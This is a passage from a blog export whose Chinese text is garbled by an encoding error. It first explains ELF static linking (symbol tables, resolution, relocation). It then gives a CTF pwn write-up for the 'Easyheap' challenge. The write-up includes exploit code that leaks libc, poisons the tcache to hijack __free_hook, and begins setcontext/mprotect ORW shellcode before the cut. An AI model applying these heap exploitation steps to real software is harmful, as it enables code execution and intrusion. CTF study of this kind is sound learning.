title="st_info"></a>st_info</h3><p>st_infoåˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†<strong>Symbol Type</strong>å’Œ<strong>Symbol Binding</strong>ã€‚</p><p><em><strong>Bindï¼š</strong></em></p><table><thead><tr><th>å®å®šä¹‰</th><th>å€¼</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>STB_LOCAL</td><td>0</td><td>æœ¬åœ°ç¬¦å·åœ¨ç›®æ ‡æ–‡ä»¶ä¹‹å¤–æ˜¯ä¸å¯è§çš„ï¼Œç›®æ ‡æ–‡ä»¶åŒ…å« äº†ç¬¦å·çš„å®šä¹‰ï¼Œå¦‚ä¸€ä¸ªå£°æ˜ä¸º static çš„å‡½æ•°ã€‚</td></tr><tr><td>STB_GLOBAL</td><td>1</td><td>å…¨å±€ç¬¦å·å¯¹äºæ‰€æœ‰è¦åˆå¹¶çš„ç›®æ ‡æ–‡ä»¶æ¥è¯´éƒ½æ˜¯å¯è§ çš„ã€‚ä¸€ä¸ªå…¨å±€ç¬¦å·åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­è¿›è¡Œå®šä¹‰åï¼Œå¦å¤–ä¸€ä¸ªæ–‡ä»¶å¯ä»¥å¯¹è¿™ ä¸ªç¬¦å·è¿›è¡Œå¼•ç”¨ã€‚</td></tr><tr><td>STB_WEAK</td><td>2</td><td>ä¸å…¨å±€ç»‘å®šç±»ä¼¼ï¼Œä¸è¿‡æ¯” STB_GLOBAL çš„ä¼˜å…ˆçº§ä½ã€‚ è¢«æ ‡è®°ä¸º STB_WEAK çš„ç¬¦å·æœ‰å¯èƒ½ä¼šè¢«åŒåçš„æœªè¢«æ ‡è®°ä¸º STB_WEAK çš„ç¬¦å·è¦†ç›–ã€‚</td></tr></tbody></table><p><em><strong>Typeï¼š</strong></em></p><table><thead><tr><th>å®å®šä¹‰</th><th>å€¼</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>STT_NOTYPE</td><td>0</td><td>ç¬¦å·ç±»å‹æœªå®šä¹‰ã€‚</td></tr><tr><td>STT_OBJECT</td><td>1</td><td>è¯¥ç¬¦å·æ˜¯ä¸€ä¸ªæ•°æ®å¯¹è±¡ï¼Œæ¯”å¦‚å˜é‡ã€æ•°ç»„ç­‰</td></tr><tr><td>STT_FUNC</td><td>2</td><td>è¡¨ç¤ºè¯¥ç¬¦å·ä¸å‡½æ•°æˆ–è€…å…¶ä»–å¯æ‰§è¡Œä»£ç å…³è”ã€‚</td></tr><tr><td>STT_SECTION</td><td>3</td><td>è¯¥ç¬¦å·è¡¨ç¤ºä¸€ä¸ªæ®µï¼Œè¿™ç§ç¬¦å·å¿…é¡»æ˜¯STB_LOCALçš„</td></tr><tr><td>STT_FILE</td><td>4</td><td>è¯¥ç¬¦å·è¡¨ç¤ºæ–‡ä»¶åï¼Œä¸€èˆ¬æ˜¯è¯¥ç›®æ ‡æ–‡ä»¶å¯¹åº”çš„æºæ–‡ä»¶åï¼Œå®ƒä¸€å®šæ˜¯STB_LOCALç±»å‹çš„ï¼Œå¹¶ä¸”å®ƒçš„st_shndxä¸€å®šæ˜¯SHN_ABS</td></tr></tbody></table><h3 id="st-shndx"><a href="#st-shndx" class="headerlink" title="st_shndx"></a>st_shndx</h3><table><thead><tr><th>å®å®šä¹‰</th><th>å€¼</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>SHN_ABS</td><td>0xfff1</td><td>è¡¨ç¤ºè¯¥ç¬¦å·åŒ…å«ä¸€ä¸ªç»å¯¹çš„å€¼ï¼Œæ¯”å¦‚æ–‡ä»¶åçš„ç¬¦å·</td></tr><tr><td>SHN_COMMON</td><td>0xfff2</td><td>è¡¨ç¤ºè¯¥ç¬¦å·æ˜¯ä¸€ä¸ªâ€œcommonå—â€ç±»å‹çš„ç¬¦å·ï¼Œä¸€èˆ¬æœªåˆå§‹åŒ–çš„å…¨å±€ç¬¦å·å°±æ˜¯è¿™ç§ç±»å‹çš„ã€‚</td></tr><tr><td>SHN_UNDEF</td><td>0</td><td>è¡¨ç¤ºè¯¥ç¬¦å·æœªå®šä¹‰ã€‚è¿™ä¸ªç¬¦å·è¡¨ç¤ºè¯¥æœç¬¦å·åœ¨ç›®æ ‡æ–‡ä»¶è¢«å¼•ç”¨ï¼Œä½†å®šä¹‰åœ¨å…¶ä»–ç›®æ ‡æ–‡ä»¶ä¸­</td></tr></tbody></table><p>ä»¥ä¸Šå°±æ˜¯é™¤äº†é‡å®šä½æ®µä»¥å¤–å…³äºé™æ€é“¾æ¥çš„çš„æ ¸å¿ƒsectionã€‚é‡å®šä½æˆ‘ä»¬åœ¨åé¢è®¨è®ºé™æ€é“¾æ¥çš„è¿‡ç¨‹ä¸­å†è®¨è®ºã€‚</p><h1 id="é™æ€é“¾æ¥è¿‡ç¨‹"><a href="#é™æ€é“¾æ¥è¿‡ç¨‹" class="headerlink" title="é™æ€é“¾æ¥è¿‡ç¨‹"></a>é™æ€é“¾æ¥è¿‡ç¨‹</h1><h2 id="ç¬¦å·è§£æ"><a href="#ç¬¦å·è§£æ" class="headerlink" title="ç¬¦å·è§£æ"></a>ç¬¦å·è§£æ</h2><p> é™æ€é“¾æ¥çš„ç¬¬ä¸€æ­¥éœ€è¦ç¬¦å·è§£æï¼Œåœ¨ELFæ–‡ä»¶è¢«è¯»å…¥å†…å­˜åï¼Œä¸åŒçš„æ–‡ä»¶å¯èƒ½æœ‰ç›¸åŒçš„ç¬¦å·åã€‚ç¬¦å·è§£æéœ€è¦è§£å†³è¿™ç§å†²çªï¼Œéœ€è¦åœ¨æ‰€æœ‰çš„ELFä¸­é€‰æ‹©ä¸€ä¸ªä½œä¸ºè¯¥ç¬¦å·çš„å®šä¹‰ï¼Œå½“ç„¶å¯¹äºå±€éƒ¨ç¬¦å·è€Œè¨€æ˜¯ä¸éœ€è¦è€ƒè™‘ä¸åŒæ–‡ä»¶ä»¶çš„å†²çªé—®é¢˜çš„ã€‚</p><p>å¯¹äºå…¨å±€ç¬¦å·è€Œè¨€å…¶æœ‰å››ç§çŠ¶æ€</p><table><thead><tr><th>çŠ¶æ€</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>Defined(æœ‰å®šä¹‰)</td><td>è¯¥ç¬¦å·åœ¨ELFæ–‡ä»¶ä¸­æœ‰ç¡®åˆ‡çš„ä½ç½®æ¥å‚¨å­˜å…¶æ•°å€¼</td></tr><tr><td>Tentative(ä¸´æ—¶å®šä¹‰)</td><td>è¯¥ç¬¦å·æ²¡æœ‰ç¡®å®šçš„å‚¨å­˜ç©ºé—´ï¼Œä¹Ÿå°±æ˜¯åœ¨SHN_COMMONä¸­çš„å…¨å±€å˜é‡ï¼Œåœ¨ç¼–è¯‘é˜¶æ®µæ— æ³•ç¡®å®šå…¶æœ€æœ€ç»ˆå½’å±</td></tr><tr><td>Undefined(æœªå®šä¹‰)</td><td>è¯¥ç¬¦å·æ²¡æœ‰å‚¨å­˜ç©ºé—´ï¼Œä¹Ÿå°±æ˜¯å…¶å±äºSHN_UNDEFæ®µ</td></tr><tr><td>Weak Bind(å¼±å®šä¹‰)</td><td>è¯¥ç¬¦å·å±äºå¼±å®šä¹‰ï¼Œä¹Ÿå°±æ˜¯å…¶bindä¸ºSTB_WEAK</td></tr></tbody></table><p>è¿™äº›ç¬¦å·çš„ä¼˜å…ˆçº§ä¸º<strong>Undefined &lt; Weak Bind &lt; Tentative &lt; Defined</strong></p><p>å…¨å±€ç¬¦å·åªèƒ½å­˜åœ¨ä¸€ä¸ªï¼Œå½“å‡ºç°é‡å¤çš„å…¨å±€ç¬¦å·æ—¶åªèƒ½é€‰æ‹©ä¸€ä¸ªä½œä¸ºç›®æ ‡æ–‡ä»¶çš„ç¬¦å·ï¼Œè¿™é‡Œçš„å››ç§ç¬¦å·ï¼Œ<strong>å¼ºç¬¦å·åªæœ‰Defined</strong>è¿™ä¸€ç§ï¼Œå…¶ä½™ä¸‰é¡¹éƒ½æ˜¯å¼±ç¬¦å·</p><p>è€Œé€‰æ‹©ç¬¦å·æœ‰ä»¥ä¸‹æ¡è§„åˆ™ï¼š</p><ul><li>å½“å­˜åœ¨å¼ºç¬¦å·ï¼Œä¸”åªæœ‰è¿™ä¸€ä¸ªå¼ºç¬¦å·æ—¶ï¼Œé€‰æ‹©è¯¥å¼ºç¬¦å·</li><li>å½“åŒæ—¶å­˜åœ¨å¤šä¸ªå¼ºç¬¦å·æ—¶ï¼Œé“¾æ¥å™¨æ— æ³•å¤„ç†ï¼ŒæŠ¥é”™</li><li>å½“æ²¡æœ‰å¼ºç¬¦å·å­˜åœ¨æ—¶ï¼ŒæŒ‰ç…§ä¼˜å…ˆçº§é€‰æ‹©ä¸€ä¸ªå¼±ç¬¦å·</li></ul><p>å¤§å¤šæ•°æƒ…å†µä¸‹å¯ä»¥é€šè¿‡è¿™ä¸ªè§„åˆ™é€‰æ‹©å‡ºéœ€è¦çš„ç¬¦å·ï¼Œä½†è‹¥åœ¨æœ€åä¸€ç§æƒ…å†µä¸‹å‡ºç°typeå’Œsizeçš„åŒºåˆ†æœ‰æ—¶å€™é“¾æ¥å™¨ä¹Ÿä¼šæ— æ³•åšå‡ºå†³å®šã€‚</p><p>ç»è¿‡è¿™ä¸€æ­¥é“¾æ¥å™¨å°±å°†ä¸åŒçš„ELFæ–‡ä»¶ä¸­çš„ç¬¦å·å…¨éƒ¨å¤„ç†å®Œæˆäº†</p><h2 id="Section-merge"><a href="#Section-merge" class="headerlink" title="Section merge"></a>Section merge</h2><p>å½“æˆ‘ä»¬çš„ç¬¦å·è§£æå®Œæˆåï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¯¹ç›¸åŒç±»å‹çš„sectionè¿›è¡Œåˆå¹¶ã€‚é€šè¿‡è¢«è§£æçš„ç¬¦å·ï¼Œå°†ç›¸åŒsectionçš„ç¬¦å·æ”¾åœ¨åŒä¸€sectionï¼Œè¿™æ ·æˆ‘ä»¬å°±ç¡®å®šäº†æ¯ä¸ªç¬¦å·åœ¨EOFæ–‡ä»¶ä¸­çš„å¤§å°å’Œèµ·å§‹ä½ç½®ï¼Œå»ºç«‹èµ·ä¸€ä¸ªæ˜ å°„å…³ç³»ã€‚åˆå¹¶èµ·æ¥çš„sectionè¢«ç§°ä½œSegmentã€‚</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210810182800665.png" alt="Sectionåˆå¹¶"></p><h2 id="å¼•ç”¨é‡å®šä½"><a href="#å¼•ç”¨é‡å®šä½" class="headerlink" title="å¼•ç”¨é‡å®šä½"></a>å¼•ç”¨é‡å®šä½</h2><p>å®Œæˆç¬¦å·è§£æå’Œsectionåˆå¹¶ååŸºæœ¬EOFæ–‡ä»¶æˆå‹ï¼Œä½†æ˜¯å‡½æ•°æˆ–è€…å˜é‡ä¹‹é—´çš„è°ƒç”¨ä½ç½®è¿˜æ²¡æœ‰å†™å…¥ï¼Œè¿™æ—¶å°±éœ€è¦å¯¹æ‰€æœ‰çš„ç¬¦å·è¿›è¡Œé‡å®šä½ã€‚</p><p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹é‡å®šä½è¡¨çš„ç»“æ„</p><h3 id="Relocation-Table"><a href="#Relocation-Table" class="headerlink" title="Relocation Table"></a>Relocation Table</h3><p>å¯¹äºå¯ä»¥é‡å®šä½çš„ELFæ–‡ä»¶æ¥è¯´ï¼Œå®ƒå¿…é¡»æœ‰é‡å®šä½è¡¨ã€‚å¯¹äºæ¯ä¸ªè¦è¢«é‡å®šä½çš„ELFæ®µéƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„é‡å®šä½è¡¨ã€‚å¯¹åº”.textæœ‰<strong>.rel.text</strong>ï¼Œå¯¹äº.dataæœ‰<strong>.rel.data</strong>ã€‚æ¯ä¸ªè¦è¢«é‡å®šä½çš„åœ°æ–¹å«åšé‡å®šä½å…¥å£ã€‚</p><p>é‡å®šä½å…¥å£ç»“æ„ä¸ºï¼š</p><table><thead><tr><th>æˆå‘˜</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>r_offset</td><td>é‡å®šä½å…¥å£çš„åç§»ï¼Œè¿™ä¸ªå€¼è¡¨ç¤ºè¯¥é‡å®šä½å…¥å£æ‰€è¦ä¿®æ­£çš„ä½ç½®çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ç›¸å¯¹äºæ®µçš„åç§»</td></tr><tr><td>r_info</td><td>é‡å®šä½å…¥å£çš„ç±»å‹å’Œç¬¦å·ï¼Œä¸€éƒ¨åˆ†è¡¨ç¤ºé‡å®šä½å…¥å£çš„ç±»å‹ï¼Œä¸€éƒ¨åˆ†æ˜¯é‡å®šä½å…¥å£åœ¨ç¬¦å·è¡¨çš„ä¸‹æ ‡</td></tr></tbody></table><p>é“¾æ¥å™¨çŸ¥é“äº†ä»¥ä¸Šä¸¤ä¸ªæˆå‘˜å°±çŸ¥é“äº†åœ¨å“ªé‡Œè¿›è¡Œé‡å®šä½ï¼Œåˆé‡å®šä½åˆ°å“ªé‡Œå»ã€‚</p><p>è€Œé‡å®šä½çš„ç±»å‹åˆ™å¯¹åº”ç€å¤šç§å¤šæ ·çš„å¯»å€æ¨¡å¼ï¼Œè€Œé‡å®šä½çš„åŸºæœ¬ç±»å‹åˆ†ä¸ºç›¸å¯¹å¯»å€å’Œç»å¯¹å¯»å€ã€‚</p><h3 id="ä¸¤ç§æŒ‡ä»¤ä¿®æ­£æ–¹å¼"><a href="#ä¸¤ç§æŒ‡ä»¤ä¿®æ­£æ–¹å¼" class="headerlink" title="ä¸¤ç§æŒ‡ä»¤ä¿®æ­£æ–¹å¼"></a>ä¸¤ç§æŒ‡ä»¤ä¿®æ­£æ–¹å¼</h3><p>æˆ‘ä»¬å…ˆè®¾ï¼š</p><p><strong>A = ä¿å­˜åœ¨è¢«ä¿®æ­£ä½ç½®çš„å€¼</strong></p><p><strong>P = è¢«ä¿®æ­£çš„ä½ç½®ï¼Œå¯ä»¥é€šè¿‡r_offsetå¾—åˆ°</strong></p><p><strong>S = ç¬¦å·çš„å®é™…åœ°å€ï¼Œè¿™ä¸ªå¯ä»¥é€šè¿‡r_infoå¾—åˆ°</strong></p><h4 id="ç›¸å¯¹å¯»å€"><a href="#ç›¸å¯¹å¯»å€" class="headerlink" title="ç›¸å¯¹å¯»å€"></a>ç›¸å¯¹å¯»å€</h4><p>å¯¹ä¸ç›¸å¯¹å¯»å€è€Œè¨€ï¼Œæˆ‘ä»¬å…ˆé€šè¿‡é‡å®šä½è¡¨çš„r_offsetæ‰¾åˆ°äº†<em><strong>P</strong></em>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦ä¿®æ”¹çš„ä½ç½®ã€‚</p><p>ç„¶åé€šè¿‡r_infoæ‰¾åˆ°å¯¹åº”è¦å¼•ç”¨ç¬¦å·çš„çš„ç¬¦å·è¡¨ï¼Œä¹Ÿå°±æ‰¾åˆ°äº†<em><strong>S</strong></em>ï¼Œç¬¦å·çš„ç›¸å¯¹ä½ç½®ã€‚</p><p>ä»…ä»…è¿™æ ·æ˜¯ä¸å¤Ÿçš„æˆ‘ä»¬è¿˜è¦è€ƒè™‘ripæŒ‡é’ˆåœ¨å¼•ç”¨æ—¶çš„ä½ç½®ï¼Œè¿™ç”±æŒ‡ä»¤æœ¬èº«å†³å®šï¼Œåœ¨è¢«è¦è¢«ä¿®æ”¹çš„åœ°æ–¹ä¿å­˜ç€è¿™å€¼<em><strong>A</strong></em>ã€‚</p><p>é‚£ä¹ˆç›¸å¯¹å¯»å€è¦ä¿®æ”¹ä¸º<em><strong>S-P+A</strong></em>ã€‚è¿™æ ·æˆ‘ä»¬å°±å®ç°äº†ç›¸å¯¹å¯»å€ã€‚</p><h4 id="ç»å¯¹å¯»å€"><a href="#ç»å¯¹å¯»å€" class="headerlink" title="ç»å¯¹å¯»å€"></a>ç»å¯¹å¯»å€</h4><p>ç»å¯¹å¯»å€å°±ä¸ç”¨è€ƒè™‘äºŒè€…çš„åç§»ï¼Œåªéœ€è¦è€ƒè™‘Så’ŒAå³å¯ï¼Œæ—¢å†™å…¥çš„æ˜¯S+Aã€‚</p><h1 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h1><p>è¿™äº›å°±æ˜¯é™æ€é“¾æ¥çš„ä¸€äº›åŸºæœ¬çš„æ¡†æ¶äº†ï¼Œäº†è§£äº†è¿™äº›ä¹Ÿå°±åŸºæœ¬äº†è§£äº†é“¾æ¥çš„å¤§è‡´è¿‡ç¨‹ã€‚å­¦ä¹ è¿™ä¸€å—ç¿»äº†å¥½å¤šä¹¦ï¼Œä¹Ÿçœ‹äº†äº›è§†é¢‘ï¼Œæˆ‘ä¼šåˆ—åœ¨ä¸‹é¢çš„å‚è€ƒèµ„æ–™é‡Œï¼Œæœ‰ä¸æ˜ç™½çš„åœ°æ–¹ä¾›å¤§å®¶å‚è€ƒã€‚</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><blockquote><p>å“”å“©å“”é‡Œupä¸»<em><strong>yaaangmin</strong></em>çš„è§†é¢‘ï¼šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿåˆé›†(<a href="https://www.bilibili.com/video/BV17K4y1N7Q2">https://www.bilibili.com/video/BV17K4y1N7Q2</a>)</p><p>ä»¥åŠå…¶ç¼–å†™çš„æ–‡æ¡£ï¼š<a href="https://github.com/yangminz/bcst_csapp/releases/tag/chapter_1_2_3">https://github.com/yangminz/bcst_csapp/releases/tag/chapter_1_2_3</a> </p><p><em><strong>ã€Šæ·±å…¥äº†è§£è®¡ç®—æœºç³»ç»Ÿ(csapp)ã€‹</strong></em></p><p><em><strong>ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»â€”â€”é“¾æ¥ã€è£…è½½ä¸åº“ã€‹</strong></em></p><p><em><strong>ã€ŠlinuxäºŒè¿›åˆ¶åˆ†æã€‹</strong></em></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Base </category>
          
          <category> link </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF July X CBCTF 4th pwn</title>
      <link href="/2021/08/04/DASCTF%20July%20X%20CBCTF%204th%20pwn/"/>
      <url>/2021/08/04/DASCTF%20July%20X%20CBCTF%204th%20pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¹‹å‰å†™äº†ä¸€åŠçš„ret2dlçš„åšå®¢è¿˜æ²¡å†™å®Œï¼Œæœ¬æ¥å‡†å¤‡è¾¹å†™è¾¹å­¦ã€‚åé¢å‘ç°æ¶‰åŠçš„ä¸œè¥¿æœ‰äº›å¤šï¼Œæ‰€ä»¥è¿˜æ˜¯å‡†å¤‡å½»åº•ç†è§£äº†å†æ¥ç€å†™ã€‚æœ€è¿‘æ‰“äº†å®‰æ’çš„æ¯”èµ›ï¼Œè¿™é‡Œè®°å½•å’Œå¤ç°ä¸€ä¸‹è¿™åœºæ¯”èµ›çš„pwnã€‚</p><h1 id="Easyheap"><a href="#Easyheap" class="headerlink" title="Easyheap"></a>Easyheap</h1><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>æˆ‘ä»¬å…ˆåˆ†æä¸€ä¸‹é¢˜ç›®ï¼Œå¼€å§‹çœ‹åˆ°mainå‡½æ•°å¼€å§‹æœ‰ä¸€äº›åšåˆå§‹åŒ–çš„å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°é¢˜ç›®å¼€äº†æ²™ç›’ï¼Œæˆ‘ä»¬æ¥æŸ¥çœ‹ä¸€ä¸‹</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731105902768.png" alt="idaé‡Œå‘ç°çš„æ²™ç›’"></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo seccomp-tools dump ./Easyheap </span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731110022532.png" alt="æŸ¥çœ‹å¼€äº†ä»€ä¹ˆæ²™ç›’"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ˜¯ä¸å¯ä»¥æ‰§è¡Œexecveçš„ï¼Œé‚£ä¹ˆå°±åªèƒ½ä½¿ç”¨orwæ¥è¯»å–æˆ‘ä»¬çš„flagäº†</p><p>æˆ‘ä»¬æ¥ç€åˆ†æå‡ ä¸ªå‡½æ•°</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731151445458.png" alt="add"></p><p>å‘ç°addè¿™é‡Œå­˜åœ¨æ¼æ´ï¼Œ<strong>strdupåªä¼šæ ¹æ®ä½ è¾“å…¥çš„é•¿åº¦æ¥ç¡®å®šmallocçš„å¤§å°å’Œnbytesæ— å…³ï¼Œheap_sizeçš„å¤§å°åªå’Œæˆ‘ä»¬è¾“å…¥çš„å¤§å°nbytesæœ‰å…³ï¼Œè€Œheap_addræŒ‡å‘çš„å †æ˜¯ç”±strdupç”³è¯·æ¥çš„ï¼Œå…¶å¤§å°å’Œæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²é•¿åº¦æœ‰å…³ã€‚</strong></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731151843085.png" alt="show"></p><p>showå‡½æ•°æ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šçš„ï¼Œå…ˆæŸ¥çœ‹heapé‡Œæ˜¯å¦æœ‰</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731152046694.png" alt="delete"></p><p>deleteä¹Ÿä¸€æ ·æ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šçš„ï¼Œæ¸…ç©ºäº†æŒ‡é’ˆ</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731152303249.png" alt="edit"></p><p>editè¿™é‡Œæœ‰addå‡½æ•°ä¼ç¬”å›æ”¶ï¼Œå¦‚æœæˆ‘ä»¬åœ¨addæ—¶<strong>è¾“å…¥çš„é•¿åº¦å¤§äºæˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦</strong>ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥<strong>overwrite</strong></p><h2 id="è„šæœ¬ç¼–å†™"><a href="#è„šæœ¬ç¼–å†™" class="headerlink" title="è„šæœ¬ç¼–å†™"></a>è„šæœ¬ç¼–å†™</h2><p>è¦æƒ³æ³„éœ²libcçš„åœ°å€æˆ‘ä»¬éœ€è¦å…ˆå°†chunkæ”¾å…¥unsortedbinï¼Œé¢˜ç›®çš„libcç‰ˆæœ¬æ˜¯<em>Ubuntu GLIBC 2.27-3ubuntu1.4</em>æ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆ<strong>å¡«æ»¡tcache</strong>ï¼Œç„¶åæå‰ç”³è¯·å¥½ä¸¤ä¸ªchunkï¼Œå°†åé¢çš„chunkæ”¾å…¥unsorted_bin,é€šè¿‡ä¸Šé¢heapçš„overwriteï¼Œæ¥æŸ¥çœ‹libcç›¸å¯¹åç§»ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#0-6</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;interval&#x27;</span>)<span class="comment">#9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804181622718.png" alt="å¡«æ»¡tcache"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804182003314.png" alt="overwrite"></p><p>å¾—åˆ°æˆ‘ä»¬çš„libc</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804182401716.png" alt="æ³„éœ²libc"></p><p>å°†æˆ‘ä»¬å¯èƒ½éœ€è¦çš„åç§»å…¨éƒ¨è®¡ç®—å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc.address=un_addr-<span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&#x27;libc.address : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">malloc_hook=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;malloc_hook : &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">system_addr=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">set_context=libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br></pre></td></tr></table></figure><p>æ¢å¤ä¹‹å‰overwriteçš„chunkï¼Œå¦ä¾§æ— æ³•ä»ä¸­ç”³è¯·åˆ°åé¢çš„chunk</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804182814206.png" alt="ä¿®å¤chunk"></p><p>æˆ‘ä»¬çŸ¥é“äº†libcä¹‹åç°åœ¨å°±å¯ä»¥å»<strong>åŠ«æŒhook</strong>äº†ï¼Œæˆ‘ä»¬å°†ä¹‹å‰é‡Šæ”¾çš„chunkåˆ‡å‰²ä¸€å—å‡ºæ¥ï¼Œå†å°†å…¶æ”¾å…¥tcacheã€‚æ¥ä¸‹æ¥å†æ¬¡<strong>é€šè¿‡overwriteæ¥åŠ«æŒfree_hook</strong>ï¼Œè¿™æ ·free_hookå°±è¢«æ”¾åœ¨tcacheçš„é“¾è¡¨ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(free_hook)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;free&#x27;</span>)<span class="comment">#free_hook </span></span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804192601094.png" alt="free_hookè¢«æ”¾å…¥tcache"></p><p>æˆåŠŸåŠ«æŒfree_hookä¹‹åï¼Œç”±äºè¿™é‡Œå¼€äº†æ²™ç›’æ‰€ä»¥éœ€è¦æˆ‘ä»¬åš<strong>orw</strong>ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸€å—å¯ä»¥è°ƒç”¨å†™shellocdeçš„åœ°æ–¹ï¼Œæ‰€ä»¥éœ€è¦<strong>è°ƒç”¨mprotectå‡½æ•°</strong>ï¼Œåœ¨free_hookè¿™ä¸€é¡µæ·»åŠ å¯æ‰§è¡Œæƒé™ï¼Œè€Œåšåˆ°è¿™ä¸ªéœ€è¦é‡‡ç”¨<strong>setcontent</strong>ï¼Œæˆ‘ä»¬å°†free_hookï¼Œæ”¹å†™ä¸ºsetcontentï¼Œè¿™æ ·æˆ‘ä»¬è°ƒç”¨freeå‡½æ•°å°±ä¼šè°ƒç”¨setcontentã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new_addr =  free_hook &amp;<span class="number">0xFFFFFFFFFFFFF000</span></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdi, 